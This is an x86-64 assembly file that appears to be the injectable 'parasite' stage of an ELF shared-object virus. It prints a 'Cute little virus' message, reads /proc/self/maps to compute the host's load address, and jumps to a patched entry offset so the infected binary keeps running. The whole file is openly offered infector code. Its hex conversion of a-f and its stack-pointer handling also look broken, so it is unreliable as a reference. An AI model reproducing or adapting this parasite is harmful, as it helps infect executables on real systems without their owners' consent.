BITS 64

; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com

; Description : This parasite is foccused to be injected in a shared object. Jump-on-exit needs to be
;               an absolute address rather than an offset (so contains only the offsets and no 
;               virtual addresses). So, parasite calculates the base address (where the infected 
;               binary is loaded at runtime) and adds the base address to the offset 
;               (0xAAAAAAAAAAAAAAAA) to get an absolute address @ which the jump will happen.
;                       
;               Shellcode prints a message, generates an absolute address to transfer control to a 
;               virtual address (entry point of running shared object code)
;
; base_address_of_infected_binary = First few bytes of '/proc/self/maps' (before char '-' : 0x2d)
; Jmp_on_Exit_address             = base_address_of_infected_binary + 0xAAAAAAAAAAAAAAAA
;


global _start


;-x-x-x-x- CONSTANTS -x-x-x-x-;
STDIN       equ 0
STDOUT      equ 1
STDERR      equ 2

SYS_WRITE   equ 0x1         ; 1
SYS_EXIT    equ 0x3c        ; 60
SYS_READ    equ 0x0         ; 0
SYS_OPEN    equ 0x2         ; 2
SYS_LSEEK   equ 0x8         ; 8
SYS_EXECVE  equ 0x3b        ; 59

O_RDONLY    equ 0x0         ; 0
;-x-x-x-x- CONSTANTS -x-x-x-x-;



section .text
_start:

	xor  rbx, rbx
	mov  rbx, _start						; Current instruction's address

	; Save register state, RBX can be safely used
	push rax
	push rcx
	push rdx
	push rsi
	push rdi
	push r11

	
	jmp	parasite
	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes


parasite:

	; Print our message
	xor	rax, rax					; Zero out RAX
	add	rax, 0x1					; Syscall number of write() - 0x1
	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
									; dynamically identifying the address of the 'message' label.
	xor rdx, rdx
	mov dl, 0x39					; message size = 57 bytes (0x39)
	syscall					


	; open file in memory
	; int open(const char *pathname, int flags)		
	xor rax, rax
	xor rdi, rdi
	lea	rdi, [rel filepath] 	; pathname
	xor rsi, rsi				; 0 for O_RDONLY macro
	mov al, SYS_OPEN			; syscall number for open()
	syscall



; RBX stores the address where the binary is loaded
;--------------------------------------------------------------------

    ; AL stores the fd returned by open() syscall
    ; ssize_t read(int fd, void *buf, size_t count);
    ; 
    xor r10, r10                ; Zeroing out temporary registers
    xor r8, r8
    xor r9, r9
    xor rdi, rdi
    xor rbx, rbx
    mov dil, al                 ; fd    : al
    sub sp, 0x10                ; allocate space for /proc/<pid>/maps memory address string 
                                ; (Max 16 chars from file | usually 12 chars 5567f9154000)
    lea rsi, [rsp]              ; *buf  : get the content to be read on stack
    xor rdx, rdx
    mov dx, 0x1                 ; count : Read 0x1 byte from file at a time
    xor rax, rax



; R10 to store count of chars before '-' in /proc/self/maps
; R8 to store the extracted digit/alphabet
; Counter the number of characters in address string being read before the char '-' (0x2d)
count_characters:
    xor rax, rax                ; Syscall Number for read : 0x0
    syscall
    cmp BYTE [rsp], 0x2d        ; if 0x2d = '-' (Marks as the end of input scaning)
    je  read_characters
    add r10b, 0x1               ; else ++count : no. of characters to read next (in read_characters)
    jmp count_characters


; Don't change RAX, RDI, RSI, RDX registers.
; RBX will store the final result (the address computed)
read_characters:
    xor rax, rax                ; Syscall Number for read : 0x0
    syscall                     ; Byte read at [rsp]
    mov r8b, BYTE [rsp]         ; get the read byte in R8

    ; Check for a digit (chars/ints 0x30 : 1(in dec) to 0x39 : 9(in dec) - convert into hex)
    cmp r8b, 0x39
    jle digit_found

alphabet_found:
    ; Character read is an alphabet [a-f], do the math to convert char(int) into equivalent hex
    sub r8b, 0x61               ; R8 stores the extracted byte
    jmp load_into_rbx

; Convert the char byte (eg: 0x35 for '5') to its equivalent hex (eg: '5'(0x35) to 0x5)
; R10 Stores count : i.e. no. of characters (of base address) read as bytes
; R8 stores the converted byte (to be placed into RBX to make actual base address of binary)
digit_found:
    sub r8b, 0x30               ; r8 stores Extracted byte

load_into_rbx:
    shl rbx, 0x4
    or  rbx, r8

loop:
    add rsp, 0x1                ; increment RSI to read character at next location
    lea rsi, [rsp]
    sub r10b, 0x1
    cmp r10b, 0x0               ; check for count of characters scanned
    je  address_loaded_in_RBX
    jmp read_characters


;-------------------------------------------------------------------


address_loaded_in_RBX:
	; Restoring register state
	pop r11
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rax

	
	; RBX contains the base address (where the program is loaded in memory), adding the offset of
	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
	xor r8, r8
	mov r8, 0xAAAAAAAAAAAAAAAA
	add	rbx, r8	
	jmp	rbx
